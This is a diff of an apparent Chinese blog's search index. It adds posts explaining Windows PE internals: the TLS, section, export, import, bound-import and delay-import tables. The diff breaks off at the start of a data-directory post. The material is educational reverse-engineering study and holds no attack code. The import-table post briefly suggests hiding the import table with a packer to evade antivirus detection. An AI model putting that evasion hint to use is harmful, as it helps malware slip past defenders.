@@ -59,6 +59,104 @@
       </tags>
   </entry>
   <entry>
+    <title>TLS表结构解析</title>
+    <url>/2022/03/29/TLS%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/</url>
+    <content><![CDATA[<h1 id="TLS表结构解析"><a href="#TLS表结构解析" class="headerlink" title="TLS表结构解析"></a>TLS表结构解析</h1><h4 id="TLS表简介及其作用"><a href="#TLS表简介及其作用" class="headerlink" title="TLS表简介及其作用"></a><strong>TLS表简介及其作用</strong></h4><img data-src="/2022/03/29/TLS%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220329090230771.png" class title="image-20220329090230771">
+
+<p><strong>简介</strong>：TLS表称为线程局部存储，实现了线程内局部变量的存储访问。该技术下定义的变量能被同一个线程内部的各个函数调用，同时杜绝了其他线程对这些变量的访问。一般是会优先于程序运行的，就是会在main函数之前就运行。</p>
+<p><strong>作用</strong>：TLS解决了多线程程序设计中同步变量问题。</p>
+<p>TLS变量的创建方法有两种方式，分别是动态方式和静态方式，动态方法会用到TlsAlloc、TlsFree、TlsSetValue、TlsGetValue这几个函数来操作变量，静态方法会用声明__declspec (thread) int xx &#x3D; 1;这样的方式来创建。需要注意的是静态创建的TLS变量不能用于DLL动态库中。<br>动态TLS具体过程如下图所示</p>
+<img data-src="/2022/03/29/TLS%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220329095153203.png" class title="image-20220329095153203">
+
+<p>在010Editor中查看</p>
+<p>这是指向TLS表的RVA</p>
+<img data-src="/2022/03/29/TLS%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220329095540835.png" class title="image-20220329095540835">
+
+<p>通过FOA定位到了TLS的位置</p>
+<img data-src="/2022/03/29/TLS%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220329100957663.png" class title="image-20220329100957663">
+
+<h4 id="TLS表关键字段"><a href="#TLS表关键字段" class="headerlink" title="TLS表关键字段"></a>TLS表关键字段</h4><img data-src="/2022/03/29/TLS%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220329091901236.png" class title="image-20220329091901236">
+
+
+
+<h4 id="函数解析TLS表"><a href="#函数解析TLS表" class="headerlink" title="函数解析TLS表"></a>函数解析TLS表</h4><img data-src="/2022/03/29/TLS%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220329093208621.png" class title="image-20220329093208621">
+
+<p>与LordPE中的值是一样的</p>
+<img data-src="/2022/03/29/TLS%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220329093555282.png" class title="image-20220329093555282">
+]]></content>
+      <categories>
+        <category>逆向</category>
+      </categories>
+      <tags>
+        <tag>PE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>区段表解析及遍历</title>
+    <url>/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/</url>
+    <content><![CDATA[<h1 id="区段表结构解析"><a href="#区段表结构解析" class="headerlink" title="区段表结构解析"></a>区段表结构解析</h1><h2 id="区段名及其含义"><a href="#区段名及其含义" class="headerlink" title="区段名及其含义"></a>区段名及其含义</h2><p>使用lordPE查看区段表</p>
+<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220327174738493.png" class title="image-20220327174738493">
+
+<p>常用的一些区段</p>
+<p>.text：表示代码段，里面的数据都是代码（有些编译器是code段）</p>
+<p>.data：可读写的数据段，放的是全局变量和局部变量</p>
+<p>.rdata：表示只读数据段，但程序中很少用到该块中的数据</p>
+<p>.idata：放入导入表的信息</p>
+<p>.edata：放入导出表的信息</p>
+<p>.rsrc：表示资源段，如图标，菜单，位图等，这个区块是只读的</p>
+<p>.bss：表示位初始化的数据，很少在用，取而代之的是执行文件的.data区块的的VirtualSize被扩展大的空间里用来装未初始化的数据</p>
+<p>.crt：表示C++ 运行时(CRT)所添加的数据</p>
+<p>.tls：表示线程局部存储器包括数据的初始化值，也包括运行时所需要的额外变量</p>
+<p>.reloc：可执行文件的基址重定位，基址重定位一般仅Dll需要的</p>
+<p>.sdata：相对于全局指针的可被定位的短的读写数据</p>
+<p>.pdata：异常表,包含CPU特定的IAMGE_RUNTIME_FUNTION_ENTRY结构数组，DataDirectory中的IMAGE_DIRECTORY_ENTRY_EXCEPTION指向它</p>
+<p>.didat：延迟装入输入数据，在非Release模式下可以找到</p>
+<p>从区段表可以看出.text段的RVA为1000，大小为A966，也就是说.text区段在内存中的位置是从1000~B966。其他区段也是一样的</p>
+<p>所以因此可以画出程序加载到内存后的分布，以及文件在硬盘的分布</p>
+<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220327180422539.png" class title="image-20220327180422539">
+
+<p>程序加载到内存之后，都会分配4GB的内存地址空间（注：并不是内存大小）。在区段与区段之间并不是紧挨着的，因为内存会进行0x1000的内存对齐，空出来的空间进行填充0字节的数据。例如B966~C000的空间都是填充的0字节数据。<strong>010editor中区段与区段之间，会存在填充0的部分，这也是为了实现文件对齐。</strong></p>
+<p><strong>如何识别一个区段为代码段还是其他区段?（名字为.text并不一定就是代码块，.text可以改成任意名称，比如.asd）</strong></p>
+<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220327181036922.png" class title="image-20220327181036922">
+
+<p>RVA&#x3D;1000的是代码块</p>
+<p>最主要的还是查看特征值的属性，每个区段的属性都不一样</p>
+<p>这是.text的属性</p>
+<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220327181302574.png" class title="image-20220327181302574">
+
+<p>这是.rdata的属性</p>
+<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220327181402627.png" class title="image-20220327181402627">
+
+
+
+
+
+<h2 id="每个区段的基本信息"><a href="#每个区段的基本信息" class="headerlink" title="每个区段的基本信息"></a>每个区段的基本信息</h2><p>区段表中，每0x28个字节保存一个区段的信息<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220327181637451.png" class title="image-20220327181637451"></p>
+<p>查看区段的一些信息</p>
+<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220323100649979.png" class title="image-20220323100649979">
+
+<p>一些基本特征</p>
+<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220323101502214.png" class title="image-20220323101502214">
+
+
+
+<p>根据区段的基本特征打印相关属性（复习的时候发现这里打错了，VSize对应字段和RSize对应字段写反了，下图为重新更正的正确值）</p>
+<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220327161617678.png" class title="image-20220327161617678">
+
+<p>成功打印出了区段的属性</p>
+<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220327175531064.png" class title="image-20220327175531064">
+
+<p>与LordPE进行对比是没有错误的，这就是一次对区段表的遍历</p>
+<p>参考：<a href="https://blog.csdn.net/qq_30145355/article/details/78859214">https://blog.csdn.net/qq_30145355/article/details/78859214</a></p>
+]]></content>
+      <categories>
+        <category>逆向</category>
+      </categories>
+      <tags>
+        <tag>PE</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>PE头结构分析</title>
     <url>/2022/03/22/PE%E5%A4%B4%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/</url>
     <content><![CDATA[<p>从0开始学习PE头</p>
@@ -409,62 +507,213 @@
       </tags>
   </entry>
   <entry>
-    <title>区段表解析及遍历</title>
-    <url>/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/</url>
-    <content><![CDATA[<h1 id="区段表结构解析"><a href="#区段表结构解析" class="headerlink" title="区段表结构解析"></a>区段表结构解析</h1><h2 id="区段名及其含义"><a href="#区段名及其含义" class="headerlink" title="区段名及其含义"></a>区段名及其含义</h2><p>使用lordPE查看区段表</p>
-<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220327174738493.png" class title="image-20220327174738493">
+    <title>导出表结构解析</title>
+    <url>/2022/03/26/%E5%AF%BC%E5%87%BA%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/</url>
+    <content><![CDATA[<h1 id="导出表结构解析"><a href="#导出表结构解析" class="headerlink" title="导出表结构解析"></a>导出表结构解析</h1><h2 id="什么是导出表"><a href="#什么是导出表" class="headerlink" title="什么是导出表"></a>什么是导出表</h2><p>一个程序引用哪些模块是由导入表决定的，与导入表对应的就是导出表，导出表则是决定当前的PE文件能够给其它PE文件提供的函数。正常情况下，只有dll动态链接库才有导出表，这里用dll文件来做实验</p>
+<p>使用010Editor查看导出表</p>
+<img data-src="/2022/03/26/%E5%AF%BC%E5%87%BA%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220326140512674.png" class title="image-20220326140512674">
 
-<p>常用的一些区段</p>
-<p>.text：表示代码段，里面的数据都是代码（有些编译器是code段）</p>
-<p>.data：可读写的数据段，放的是全局变量和局部变量</p>
-<p>.rdata：表示只读数据段，但程序中很少用到该块中的数据</p>
-<p>.idata：放入导入表的信息</p>
-<p>.edata：放入导出表的信息</p>
-<p>.rsrc：表示资源段，如图标，菜单，位图等，这个区块是只读的</p>
-<p>.bss：表示位初始化的数据，很少在用，取而代之的是执行文件的.data区块的的VirtualSize被扩展大的空间里用来装未初始化的数据</p>
-<p>.crt：表示C++ 运行时(CRT)所添加的数据</p>
-<p>.tls：表示线程局部存储器包括数据的初始化值，也包括运行时所需要的额外变量</p>
-<p>.reloc：可执行文件的基址重定位，基址重定位一般仅Dll需要的</p>
-<p>.sdata：相对于全局指针的可被定位的短的读写数据</p>
-<p>.pdata：异常表,包含CPU特定的IAMGE_RUNTIME_FUNTION_ENTRY结构数组，DataDirectory中的IMAGE_DIRECTORY_ENTRY_EXCEPTION指向它</p>
-<p>.didat：延迟装入输入数据，在非Release模式下可以找到</p>
-<p>从区段表可以看出.text段的RVA为1000，大小为A966，也就是说.text区段在内存中的位置是从1000~B966。其他区段也是一样的</p>
-<p>所以因此可以画出程序加载到内存后的分布，以及文件在硬盘的分布</p>
-<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220327180422539.png" class title="image-20220327180422539">
+<p>在PE的NT头下的扩展头下的DataDirArray[0]表达的是导出表的位置和大小</p>
+<img data-src="/2022/03/26/%E5%AF%BC%E5%87%BA%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220328094315573.png" class title="image-20220328094315573">
 
-<p>程序加载到内存之后，都会分配4GB的内存地址空间（注：并不是内存大小）。在区段与区段之间并不是紧挨着的，因为内存会进行0x1000的内存对齐，空出来的空间进行填充0字节的数据。例如B966~C000的空间都是填充的0字节数据。<strong>010editor中区段与区段之间，会存在填充0的部分，这也是为了实现文件对齐。</strong></p>
-<p><strong>如何识别一个区段为代码段还是其他区段?（名字为.text并不一定就是代码块，.text可以改成任意名称，比如.asd）</strong></p>
-<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220327181036922.png" class title="image-20220327181036922">
-
-<p>RVA&#x3D;1000的是代码块</p>
-<p>最主要的还是查看特征值的属性，每个区段的属性都不一样</p>
-<p>这是.text的属性</p>
-<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220327181302574.png" class title="image-20220327181302574">
-
-<p>这是.rdata的属性</p>
-<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220327181402627.png" class title="image-20220327181402627">
+<p>可以看到VitualAddress和Size都是DWORD类型，但是这里知识导出表的起始地址(RVA)，在010editor直接Ctrl+G搜索，F1950</p>
+<img data-src="/2022/03/26/%E5%AF%BC%E5%87%BA%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220328094840802.png" class title="image-20220328094840802">
 
 
 
+<h2 id="代码解析导出表"><a href="#代码解析导出表" class="headerlink" title="代码解析导出表"></a>代码解析导出表</h2><p>导出表的基本结构，进入导出表</p>
+<img data-src="/2022/03/26/%E5%AF%BC%E5%87%BA%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220326140711566.png" class title="image-20220326140711566">
 
-
-<h2 id="每个区段的基本信息"><a href="#每个区段的基本信息" class="headerlink" title="每个区段的基本信息"></a>每个区段的基本信息</h2><p>区段表中，每0x28个字节保存一个区段的信息<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220327181637451.png" class title="image-20220327181637451"></p>
-<p>查看区段的一些信息</p>
-<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220323100649979.png" class title="image-20220323100649979">
-
-<p>一些基本特征</p>
-<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220323101502214.png" class title="image-20220323101502214">
+<p>相关的参数如图中的注释</p>
+<img data-src="/2022/03/26/%E5%AF%BC%E5%87%BA%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220326141430682.png" class title="image-20220326141430682">
 
 
 
-<p>根据区段的基本特征打印相关属性（复习的时候发现这里打错了，VSize对应字段和RSize对应字段写反了，下图为重新更正的正确值）</p>
-<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220327161617678.png" class title="image-20220327161617678">
+<p>写函数解析导出表上半部分的结构</p>
+<img data-src="/2022/03/26/%E5%AF%BC%E5%87%BA%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220326144108918.png" class title="image-20220326144108918">
 
-<p>成功打印出了区段的属性</p>
-<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220327175531064.png" class title="image-20220327175531064">
+<p>在LordPE中这就是红线框起来的部分</p>
+<img data-src="/2022/03/26/%E5%AF%BC%E5%87%BA%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220326144155090.png" class title="image-20220326144155090">
 
-<p>与LordPE进行对比是没有错误的，这就是一次对区段表的遍历</p>
-<p>参考：<a href="https://blog.csdn.net/qq_30145355/article/details/78859214">https://blog.csdn.net/qq_30145355/article/details/78859214</a></p>
+<p>还需要把下面的函数名以及RVA等打印出来</p>
+<p>后面三个属性需要是RVA需要转换</p>
+<img data-src="/2022/03/26/%E5%AF%BC%E5%87%BA%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220326150854304.png" class title="image-20220326150854304">
+
+<p>执行后成功返回我们需要的信息</p>
+<img data-src="/2022/03/26/%E5%AF%BC%E5%87%BA%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220326151530348.png" class title="image-20220326151530348">
+
+
+
+<p>重点理解一下最后三个RVA（AddressOfFunctions，AddressOfNames，AddressOfNameOrdinals）</p>
+<p>AddressOfFunctions：一个RVA，指向一个DWORD数组，数组中的每一项是一个导出函数的RVA，顺序与导出序号相同。</p>
+<p>AddressOfNames：一个RVA，依然指向一个DWORD数组，数组中的每一项仍然是一个RVA，指向一个表示函数名字。</p>
+<p>AddressOfNameOrdinals：一个RVA，还是指向一个WORD数组，数组中的每一项与AddressOfNames中的每一项对应，表示该名字的函数在AddressOfFunctions中的序号。</p>
+<img data-src="/2022/03/26/%E5%AF%BC%E5%87%BA%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220326153512424.png" class title="image-20220326153512424">
+
+
+
+<p>参考：<a href="https://blog.csdn.net/evileagle/article/details/12176797">https://blog.csdn.net/evileagle/article/details/12176797</a></p>
+]]></content>
+      <categories>
+        <category>逆向</category>
+      </categories>
+      <tags>
+        <tag>PE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>导入表结构解析</title>
+    <url>/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/</url>
+    <content><![CDATA[<h1 id="导入表解析"><a href="#导入表解析" class="headerlink" title="导入表解析"></a>导入表解析</h1><p>导入表是记录PE文件中用到的动态连接库的集合，一个dll库在导入表中占用一个元素信息的位置。而dll作为一个元素有很多信息如时间、序号、加载后的函数地址等。这些信息存在IMAGE_IMPORT_DESCRIPTOR结构体中，一个dll就是一个这样的结构体。导入表就是这些dll的集合，有点像元素（每个dll）与数组（导入表）的关系。</p>
+<p>使用LordPE先查看导入表的一些基本信息，可以看到每一个动态链接库都调用了很多api。</p>
+<img data-src="/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220325162801268.png" class title="image-20220325162801268">
+
+
+
+<p>查看三个与导入表相关的结构（图片里面的注释时该字段的说明）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IMAGE_IMPORT_DESCRIPTOR</span><br><span class="line">IMAGE_THUNK_DATA</span><br><span class="line">IMAGE_IMPORT_BY_NAME</span><br></pre></td></tr></table></figure>
+
+<p>三个结构体调用的先后关系</p>
+<img data-src="/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220327225843055.png" class title="image-20220327225843055">
+
+<img data-src="/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220325163835784.png" class title="image-20220325163835784">
+
+
+
+<h2 id="1、IMAGE-IMPORT-DESCRIPTOR解析"><a href="#1、IMAGE-IMPORT-DESCRIPTOR解析" class="headerlink" title="1、IMAGE_IMPORT_DESCRIPTOR解析"></a>1、IMAGE_IMPORT_DESCRIPTOR解析</h2><p>a、如果Characteristics的值为0，说明这是导入表结构体数组的最后一个元素，也就是导入表这个数组存放的最后一个dll。如果Characteristics的值不为0，用OriginalFirstThunk（RVA）来索引INT的地址。这张INT表存放了该dll的导出函数信息（序号与函数名）。</p>
+<p>b、当TimeDateStamp&#x3D;0时，表示未加载前IAT表与INT表完全相同；当TimeDateStamp&#x3D;-1时，表示IAT表与INT表不同，IAT表存该dll所有函数的绝对地址，当TimeDateStamp&#x3D;-1时绑定导入表才有效。</p>
+<p>c、name字段时RVA指向dll的名字</p>
+<p>d、FirstThunk，RVA指向IAT表</p>
+<img data-src="/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220325170815048.png" class title="image-20220325170815048">
+
+<h2 id="2、IAT（Import-Address-Table）和INT（Import-Name-Table）结构解析"><a href="#2、IAT（Import-Address-Table）和INT（Import-Name-Table）结构解析" class="headerlink" title="2、IAT（Import Address Table）和INT（Import Name Table）结构解析"></a>2、IAT（Import Address Table）和INT（Import Name Table）结构解析</h2><p>当加载到内存前IAT和INT结构是相同的，都指向一个结构体，也就是IMAGE_IMPORT_BY_NAME，存储着需要导入的函数的序号和名称。IAT和INT的元素为IMAGE_THUNK_DATA，它的最后一个字段由四字节的AddressOfData指向IMAGE_IMPORT_BY_NAME结构体。这就是加载到内存前，IAT和INT的结构，其实是一样的。</p>
+<p>当加载到内存后，INT依旧保存dll的函数名与函数序号的地址。但是此时IAT则根据导入表的INT（IAT加载前）的内容和导出表信息，修改为对应的函数的地址信息。如下图</p>
+<img data-src="/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220328085822090.png" class title="image-20220328085822090">
+
+<h2 id="3、绑定导入表与IAT"><a href="#3、绑定导入表与IAT" class="headerlink" title="3、绑定导入表与IAT"></a>3、绑定导入表与IAT</h2><p>上面的情况都是IAT存储着非函数地址的情况，但是有些时候加载前IAT表是要存储函数地址的。IAT存储的函数地址是dll未加载的地址。当PE文件中不存在绑定导入表时，IAT就和INT一样，此时导入表中的时间戳为0。当导入表的时间戳为-1时，IAT表就存储该dll的所有函数的绝对地址，dll的真正时间戳会存放于绑定导入表中（绑定导入表地址存放在数据目录的第12项，IAT是第13项）。</p>
+<p>PE中包含导入表的优点是程序启动快，但是其缺点也十分明显，当存在dll地址重定位和dll修改更新，则绑定导入表也需要修改更新。</p>
+<p>查看与绑定导入表相关的两个结构体</p>
+<img data-src="/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220328091610745.png" class title="image-20220328091610745">
+
+<p>PS：这两个结构体中所有的OffsetModuleName均不是相对于ImageBase的RVA也不是FOA，而是相对于绑定导入表首地址的偏移地址，即：<strong>绑定导入表首地址 + OffsetModuleName&#x3D; RVA</strong>。</p>
+<p>图解如下</p>
+<img data-src="/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220328091717637.png" class title="image-20220328091717637">
+
+<p>引用了csdn的Apollon_krj师傅的结构解析图。</p>
+<h1 id="代码解析"><a href="#代码解析" class="headerlink" title="代码解析"></a>代码解析</h1><p>结构理清楚过后就写代码来解析</p>
+<img data-src="/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220325180456376.png" class title="image-20220325180456376">
+
+<p>这里还要在主函数之中调用一下</p>
+<img data-src="/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220325180527792.png" class title="image-20220325180527792">
+
+
+
+<p>可以看到返回了我们想要的结果，把导入表进行了遍历</p>
+<img data-src="/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220325180651925.png" class title="image-20220325180651925">
+
+
+
+<p>导入表的上半部分导入表的相关信息已经解析成功了，现在解析下半部分的api函数部分</p>
+<img data-src="/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220325180821535.png" class title="image-20220325180821535">
+
+
+
+<p>还是通过写函数来解析</p>
+<img data-src="/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220325183239217.png" class title="image-20220325183239217">
+
+<img data-src="/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220325183508506.png" class title="image-20220325183508506">
+
+<p>可以看到是成功解析了的，并且顺序也没有问题，这就是一个基本的导入表的分析</p>
+<p>总结：导入表的大小主要取决于写代码的时候导入了多少动态链接库，就会在导入表这里显示导入了多少动态链接库，导入了多少函数。如果正常程序调用了太多dll可能会引起误报，所以做免杀的时候可以将导入表不显示。例如可以写壳等方式。</p>
+<p>参考：<a href="https://blog.csdn.net/Apollon_krj/article/details/77417063?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_paycolumn_v3&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_paycolumn_v3&amp;utm_relevant_index=2">https://blog.csdn.net/Apollon_krj/article/details/77417063?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_paycolumn_v3&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_paycolumn_v3&amp;utm_relevant_index=2</a></p>
+]]></content>
+      <categories>
+        <category>逆向</category>
+      </categories>
+      <tags>
+        <tag>PE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>延迟导入表结构解析</title>
+    <url>/2022/03/29/%E5%BB%B6%E8%BF%9F%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/</url>
+    <content><![CDATA[<h1 id="延迟导入表结构解析"><a href="#延迟导入表结构解析" class="headerlink" title="延迟导入表结构解析"></a>延迟导入表结构解析</h1><p>主要就是为了加快PE文件的加载速度，而且延迟导入一次只会导入一个函数，而不是一次导入整个模块的所有函数。延迟导入的加载只发生在函数第一次被调用的时候，之后IAT就填充为正确函数地址。</p>
+<p>VS2019也有自带的模块可以延迟导入DLL</p>
+<img data-src="/2022/03/29/%E5%BB%B6%E8%BF%9F%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220329102601307.png" class title="image-20220329102601307">
+
+<p>在这一项后面填写需要延迟导入的DLL名称，连接器就会自动帮我们将这些DLL的导入变为延迟导入。</p>
+<img data-src="/2022/03/29/%E5%BB%B6%E8%BF%9F%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220329102717970.png" class title="image-20220329102717970">
+
+<p>延迟导入表的流程</p>
+<img data-src="/2022/03/29/%E5%BB%B6%E8%BF%9F%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220329105003536.png" class title="image-20220329105003536">
+
+<h4 id="查看延迟导入表的字段"><a href="#查看延迟导入表的字段" class="headerlink" title="查看延迟导入表的字段"></a>查看延迟导入表的字段</h4><img data-src="/2022/03/29/%E5%BB%B6%E8%BF%9F%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220329103235901.png" class title="image-20220329103235901">
+
+<h4 id="使用函数解析"><a href="#使用函数解析" class="headerlink" title="使用函数解析"></a>使用函数解析</h4><img data-src="/2022/03/29/%E5%BB%B6%E8%BF%9F%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220329104417919.png" class title="image-20220329104417919">
+
+<img data-src="/2022/03/29/%E5%BB%B6%E8%BF%9F%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220329105255400.png" class title="image-20220329105255400">
+
+<p>与LordPE进行对比发现是一样的</p>
+<img data-src="/2022/03/29/%E5%BB%B6%E8%BF%9F%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220329105343148.png" class title="image-20220329105343148">
+
+]]></content>
+      <categories>
+        <category>逆向</category>
+      </categories>
+      <tags>
+        <tag>PE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>目录表结构与地址转换函数</title>
+    <url>/2022/03/25/%E7%9B%AE%E5%BD%95%E8%A1%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0/</url>
+    <content><![CDATA[<h1 id="数据目录表结构"><a href="#数据目录表结构" class="headerlink" title="数据目录表结构"></a>数据目录表结构</h1><p>先用LordPE看看基本的目录结构</p>
+<img data-src="/2022/03/25/%E7%9B%AE%E5%BD%95%E8%A1%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0/image-20220325091841547.png" class title="image-20220325091841547">
+
+
+
+<p>用vs查看目录结构具体有哪些参数</p>
